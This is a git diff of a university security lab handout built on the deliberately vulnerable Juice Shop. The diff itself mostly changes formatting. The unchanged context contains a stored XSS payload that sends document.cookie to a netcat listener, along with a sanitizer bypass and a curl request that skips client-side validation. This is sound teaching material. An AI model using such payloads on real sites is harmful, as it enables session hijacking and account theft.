@@ -3,7 +3,6 @@ Computer Security Lab 2: Networks and web security
 
 ## About the lab
 
-
 * This document contains task descriptions and theory for the network lab. If there are any differences between the return template and this file, consider this to be the up-to-date document.
 * **You can use your own computer if you want.** Check the chapter "Prerequisities" for information on what you need to install. This lab has been made to be completed in a Linux environment and tested to work in Ubuntu and Kali. However, it should work in any other operating system.
 * You are not expected to be able to finish all the tasks during the lab session. Feel free to continue them at your own time.
@@ -60,7 +59,7 @@ https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
 </details>
 
 
-## Prerequisities
+## Prerequisites
 
 
 If you are using the virtual machine provided to you by the course staff,
@@ -74,7 +73,7 @@ Below are the steps to set it up on your own system, in case you want to use you
 
 Get [Docker](https://www.docker.com/) instance for Juice Shop (preferrably v8.7.2)
 ```shell
-docker pull bkimminich/juice-shop
+~$ docker pull bkimminich/juice-shop
 ```
 
 All the tasks are doable using your browsers developer tools. Tasks were tested and created by using Firefox, but other browsers should work just as well.
@@ -91,7 +90,7 @@ You are expected to set up a basic server so having something like python and [f
 
 the example-voting app is located at
 ```shell
-git clone https://github.com/dockersamples/example-voting-app
+~$ git clone https://github.com/dockersamples/example-voting-app
 ```
 
 Install Wireshark and Nmap. The method depends on your operating system.
@@ -102,8 +101,8 @@ For the security experiment, you can use Burp, ZAP or any other tool you wish.
 
 </details>
 
-Grading
----
+## Grading
+
 <details>
 You are eligible to following grades in this exercise by doing tasks as defined. Great ideas and implementations could compensate for some poorly implemented ones.
 Upper grade requires that all previous ones have been done as well.
@@ -118,14 +117,14 @@ Task| Grade/Level | Description
 4|5| Network traffic analysis and a security experiment
 
 Grade 1 can be acquired by doing lecture questionnaires from the corresponding lecture.
-</details>
 
-## Particularly in tasks 1 and 2:
+### Particularly in tasks 1 and 2:
 
 ***To be able to complete these tasks,*** you will need to explain *why things are happening*. Each answer, which is giving only pure commands or code is automatically though as incompleted or insufficient.
 
 We are aware, that some answers are already available out there.
 
+</details>
 
 ---
 
@@ -137,7 +136,7 @@ If you are rusty on your SQL injections check the following before you start: ht
 
 Start Juice Shop with the command
 ```shell
-docker run --rm -p 3000:3000 bkimminich/juice-shop
+~$ docker run --rm -p 3000:3000 bkimminich/juice-shop
 ```
 Site is hosted at ```localhost:3000```. Access it with your browser. Observe and modify the traffic with your browsers developer tools while browsing the site and do the following tasks.
 
@@ -252,8 +251,8 @@ For this example we are going to use the following code snippet:
 * We can bypass the basic sanitizer that is used on the admin page with ```a|a``` in the beginning of the script. Try the script without it to see the effect.
 
 This will make the server attempt to fetch an image from a server we control and when it fails the server will send back the users cookies. This means we need a server. For this, we can utilize netcat. Use the following command to start a TCP server which listens to port 5555.
-```
-nc -l -p 5555 -v
+```shell
+~$ nc -l -p 5555 -v
 ```
 
 You can't create a user with the name ```<a|ascript><img src=http://127.0.0.1:5555?c='+ escape(document.cookie)+ '   ></script>``` using the site's own create account page. This is because Juice Shop validates the input in the client-side **but** not on the server-side. For this reason, we are going to use curl to send the user creation packet directly to the API, this way bypassing the site's input validation. In order to do this, we need to know what type of packet the API expects.
@@ -265,7 +264,7 @@ We can find out the type of packet we need in the following way:
 * Create a JSON file that is in the same format as in the POST request, change the email field to the code snippet mentioned above and send it to the user creation API using curl. Below is an example of the curl request.  
 
 ```shell
-curl -d @<your_json_file_name>.json -H "Content-Type: application/json" -X POST <API_url>
+~$ curl -d @<your_json_file_name>.json -H "Content-Type: application/json" -X POST <API_url>
 ```
 After this, log in as the administrator and go to the administration panel while you have netcat on. The administration panel should have a weird looking user and the netcat should show your cookie information.
 
@@ -316,7 +315,7 @@ Few helpful commands
 
  If the site is not visible at www.csrfattack.org, restart the apache2 service with the command
 ```
-sudo service apache2 restart
+~$ sudo service apache2 restart
 ```
 You can modify the site by editing the file found in 
 ```
@@ -324,7 +323,7 @@ You can modify the site by editing the file found in
 ```
 After you have modified the site, restart the apache2 service with the command
 ```
-sudo service apache2 restart
+~$ sudo service apache2 restart
 ```
 
 #### Returns
@@ -419,7 +418,7 @@ video.style.visibility = 'hidden';
 #### Returns
 
 * Your own server code.
-* Your own HTML/Javascrip **without directory traversal characters in its name**.
+* Your own HTML/Javascript **without directory traversal characters in its name**.
 * The *zip* archive that you uploaded to overwrite the subtitle file.
 * **Clear** instructions on how to start your own server, send the XSS attack and how to verify that the information was sent to your server from Juice Shop.
 
@@ -435,13 +434,13 @@ You can complete this task in two ways. You can do the predefined task explained
 
 Get the example-voting-app
 ```shell
-git clone https://github.com/dockersamples/example-voting-app
+~$ git clone https://github.com/dockersamples/example-voting-app
 ```
 
 Start the example-voting-app
 ```
-cd example-voting-app
-docker-compose up
+~$ cd example-voting-app
+~$ docker-compose up
 ```
 ### Task
 In this task, you are expected to learn to capture traffic by using WireShark, and to do very basic network analysis. With the knowledge you gain, you are then expected to draw a data flow diagram on how the system behaves when you cast a vote or check the results. After this, you try some form of a security experiment(for example modify traffic using Burp Suite). Report your results even if you are unsuccessful. 
@@ -457,7 +456,7 @@ Use Wireshark on the two docker networks to see what happens when a vote is atte
  
 To run Wireshark correctly without using straight root privileges, we should add the current user to group *Wireshark* with the following command:
 ```shell
-sudo usermod -a -G wireshark compsec
+~$ sudo usermod -a -G wireshark compsec
 ```
 Log out and log in, Wireshark should show now all interfaces. This is already done with the provided Kali Linux.
 
